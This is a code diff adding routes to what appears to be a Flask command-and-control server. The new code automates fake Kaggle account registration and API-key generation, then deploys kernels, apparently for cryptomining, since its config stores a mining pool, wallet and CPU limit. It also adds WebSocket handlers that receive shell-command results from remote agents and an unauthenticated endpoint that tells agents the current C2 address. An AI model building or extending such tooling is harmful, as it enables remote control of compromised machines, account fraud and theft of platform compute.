@@ -4530,6 +4530,168 @@ def autoreg_account_logs(reg_id):
         "logs": [dict(l) for l in logs]
     })
 
+# ──────────────────────── API: KAGGLE AUTO-DEPLOY ────────────────────────
+
+kaggle_auto_deploy_progress = {
+    "running": False,
+    "stage": "",
+    "account": None,
+    "dataset": None,
+    "kernel": None,
+    "error": None,
+    "logs": []
+}
+
+@app.route("/api/kaggle/auto-deploy", methods=["POST"])
+@login_required
+def kaggle_auto_deploy():
+    """Full automated Kaggle deployment: create account -> get API key -> create dataset -> deploy kernel."""
+    global kaggle_auto_deploy_progress
+    
+    if kaggle_auto_deploy_progress["running"]:
+        return jsonify({"error": "Deploy already running"}), 409
+    
+    data = request.get_json(silent=True) or {}
+    
+    # Reset progress
+    kaggle_auto_deploy_progress = {
+        "running": True,
+        "stage": "init",
+        "account": None,
+        "dataset": None,
+        "kernel": None,
+        "error": None,
+        "logs": []
+    }
+    
+    def _log(msg):
+        kaggle_auto_deploy_progress["logs"].append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
+        socketio.emit("kaggle_auto_deploy_progress", kaggle_auto_deploy_progress)
+    
+    def _run():
+        try:
+            # Stage 1: Create account via autoreg
+            _log("Stage 1: Creating Kaggle account...")
+            kaggle_auto_deploy_progress["stage"] = "autoreg"
+            
+            job = job_manager.create_job(
+                platform="kaggle",
+                mail_provider=data.get("mail_provider", "boomlify"),
+                count=1,
+                headless=data.get("headless", True),
+                proxy=data.get("proxy", ""),
+                browser=data.get("browser", "chrome")
+            )
+            job.set_socketio(socketio)
+            
+            # Wait for account creation
+            for _ in range(300):  # 5 min timeout
+                time.sleep(1)
+                if job.status == "done":
+                    break
+                if job.status == "error":
+                    raise Exception(f"Autoreg failed: {job.error}")
+            
+            # Get created account
+            accounts = [a for a in account_store.get_all() if a.get("platform") == "kaggle"]
+            if not accounts:
+                raise Exception("No Kaggle account created")
+            
+            account = accounts[-1]  # Latest account
+            kaggle_auto_deploy_progress["account"] = account
+            _log(f"✓ Account created: {account.get('username')}")
+            
+            # Stage 2: Generate Legacy API Key
+            _log("Stage 2: Generating API key...")
+            kaggle_auto_deploy_progress["stage"] = "api_key"
+            
+            reg_id = account.get("id")
+            api_key_result = None
+            
+            # Use legacy-key endpoint
+            import subprocess
+            result = subprocess.run(
+                ["python3", "-c", f"""
+import sys
+sys.path.insert(0, '{BASE_DIR}')
+from src.agents.kaggle.legacy_key import generate_legacy_key
+result = generate_legacy_key('{reg_id}')
+print(result)
+"""],
+                capture_output=True, text=True, timeout=120, cwd=str(BASE_DIR)
+            )
+            
+            if result.returncode == 0:
+                api_key = result.stdout.strip().split('\n')[-1]
+                if len(api_key) > 30:
+                    account["api_key"] = api_key
+                    account_store.update(reg_id, {"api_key": api_key})
+                    _log(f"✓ API key generated: {api_key[:8]}...")
+                else:
+                    raise Exception("Invalid API key format")
+            else:
+                raise Exception(f"API key generation failed: {result.stderr[:100]}")
+            
+            # Stage 3: Update config.json
+            _log("Stage 3: Updating config.json...")
+            kaggle_auto_deploy_progress["stage"] = "config"
+            
+            config_path = BASE_DIR / "config.json"
+            cfg = {}
+            if config_path.exists():
+                try:
+                    cfg = json.loads(config_path.read_text())
+                except: pass
+            
+            cfg["kaggle_username"] = account.get("username")
+            cfg["kaggle_api_key"] = account.get("api_key")
+            cfg["updated"] = int(time.time())
+            config_path.write_text(json.dumps(cfg, indent=2))
+            _log(f"✓ Config updated for: {account.get('username')}")
+            
+            # Stage 4: Create dataset and kernel
+            _log("Stage 4: Creating dataset and kernel...")
+            kaggle_auto_deploy_progress["stage"] = "deploy"
+            
+            from src.agents.kaggle.datasets import create_dataset_and_kernel
+            result = create_dataset_and_kernel(
+                username=account.get("username"),
+                api_key=account.get("api_key"),
+                log_fn=_log
+            )
+            
+            if result.get("success"):
+                kaggle_auto_deploy_progress["dataset"] = result.get("dataset_slug")
+                kaggle_auto_deploy_progress["kernel"] = result.get("kernel_slug")
+                _log(f"✓ Dataset: {result.get('dataset_slug')}")
+                _log(f"✓ Kernel: {result.get('kernel_slug')}")
+            else:
+                raise Exception(f"Deploy failed: {result.get('error')}")
+            
+            # Done
+            kaggle_auto_deploy_progress["stage"] = "done"
+            kaggle_auto_deploy_progress["running"] = False
+            _log("✓ Full deployment complete!")
+            log_event("kaggle_auto_deploy", f"Account: {account.get('username')}, Kernel: {result.get('kernel_slug')}")
+            
+        except Exception as e:
+            kaggle_auto_deploy_progress["error"] = str(e)
+            kaggle_auto_deploy_progress["running"] = False
+            kaggle_auto_deploy_progress["stage"] = "error"
+            _log(f"✗ Error: {e}")
+            log_event("kaggle_auto_deploy_error", str(e))
+        
+        socketio.emit("kaggle_auto_deploy_progress", kaggle_auto_deploy_progress)
+    
+    threading.Thread(target=_run, daemon=True).start()
+    return jsonify({"status": "started", "message": "Full automated deployment started"})
+
+@app.route("/api/kaggle/auto-deploy/progress")
+@login_required
+def kaggle_auto_deploy_progress():
+    """Get current progress of automated deployment."""
+    return jsonify(kaggle_auto_deploy_progress)
+
 @app.route("/api/agent/<agent_id>/update", methods=["POST"])
 @login_required
 def update_agent(agent_id):
@@ -4978,6 +5140,54 @@ def ws_command(data):
     db.close()
     emit("command_queued", {"task_id": task_id, "agent_id": agent_id, "command": cmd})
 
+# ──────────────────────── WEBSOCKET AGENT ENDPOINT ────────────────────────
+
+@socketio.on("agent_connect")
+def ws_agent_connect(data):
+    """Agent WebSocket connection for real-time control."""
+    agent_id = data.get("agent_id", "")
+    hostname = data.get("hostname", "")
+    
+    # Log connection
+    log_event("agent_ws_connect", f"{agent_id[:8]} ({hostname}) connected via WebSocket")
+    
+    # Update agent status
+    db = get_db()
+    db.execute("UPDATE agents SET last_seen=?, is_alive=1 WHERE id=?", 
+               (int(time.time()), agent_id))
+    db.commit()
+    db.close()
+    
+    emit("agent_connected", {"status": "ok", "agent_id": agent_id})
+
+@socketio.on("agent_shell_result")
+def ws_agent_shell_result(data):
+    """Receive shell command result from agent via WebSocket."""
+    task_id = data.get("task_id", "")
+    result = data.get("result", "")
+    agent_id = data.get("agent_id", "")
+    
+    # Store result
+    db = get_db()
+    db.execute("UPDATE tasks SET status='done', result=? WHERE id=?", (result, task_id))
+    db.commit()
+    db.close()
+    
+    # Emit to UI
+    emit("task_result", {"task_id": task_id, "result": result, "agent_id": agent_id})
+    log_event("agent_ws_result", f"{agent_id[:8]} task {task_id[:8]} completed")
+
+@socketio.on("agent_ping")
+def ws_agent_ping(data):
+    """Keep-alive ping from agent."""
+    agent_id = data.get("agent_id", "")
+    db = get_db()
+    db.execute("UPDATE agents SET last_seen=?, is_alive=1 WHERE id=?", 
+               (int(time.time()), agent_id))
+    db.commit()
+    db.close()
+    emit("agent_pong", {"status": "alive"})
+
 # ──────────────────────── FORM HOOKS ────────────────────────
 
 @app.route("/api/hashvault/stats")
@@ -5331,6 +5541,70 @@ def get_public_url():
         "url": _get_public_url(),
         "local": f"{request.scheme}://{request.host}",
     })
+
+@app.route("/api/c2/url", methods=["GET"])
+def api_c2_url():
+    """Public endpoint for agents to get current C2 URL."""
+    # No auth required - agents need to find C2
+    url = _get_kaggle_c2_url() or _get_public_url()
+    return jsonify({"url": url, "timestamp": int(time.time())})
+
+@app.route("/api/config/kaggle", methods=["GET", "POST"])
+@login_required
+def api_config_kaggle():
+    """Get or update Kaggle config (username, api_key, c2_url)."""
+    if session.get("role") != "admin":
+        return jsonify({"error": "admin only"}), 403
+    
+    config_path = BASE_DIR / "config.json"
+    
+    if request.method == "GET":
+        # Read current config
+        if config_path.exists():
+            try:
+                cfg = json.loads(config_path.read_text())
+                # Mask API key for security
+                masked = cfg.copy()
+                if masked.get("kaggle_api_key"):
+                    masked["kaggle_api_key"] = masked["kaggle_api_key"][:8] + "..." if len(masked["kaggle_api_key"]) > 8 else "***"
+                return jsonify(masked)
+            except:
+                return jsonify({"error": "Failed to read config"}), 500
+        return jsonify({})
+    
+    # POST - update config
+    data = request.get_json(silent=True) or {}
+    
+    # Read existing config
+    cfg = {}
+    if config_path.exists():
+        try:
+            cfg = json.loads(config_path.read_text())
+        except: pass
+    
+    # Update fields
+    if "kaggle_username" in data:
+        cfg["kaggle_username"] = data["kaggle_username"]
+    if "kaggle_api_key" in data:
+        cfg["kaggle_api_key"] = data["kaggle_api_key"]
+    if "c2_url" in data:
+        cfg["c2_url"] = data["c2_url"]
+    if "pool" in data:
+        cfg["pool"] = data["pool"]
+    if "wallet" in data:
+        cfg["wallet"] = data["wallet"]
+    if "cpu_limit" in data:
+        cfg["cpu_limit"] = data["cpu_limit"]
+    
+    cfg["updated"] = int(time.time())
+    
+    # Write config
+    try:
+        config_path.write_text(json.dumps(cfg, indent=2))
+        log_event("config_update", f"Kaggle config updated by admin")
+        return jsonify({"status": "ok", "config": cfg})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 def _tunnel_loop(port: int):
     import subprocess, re as _re
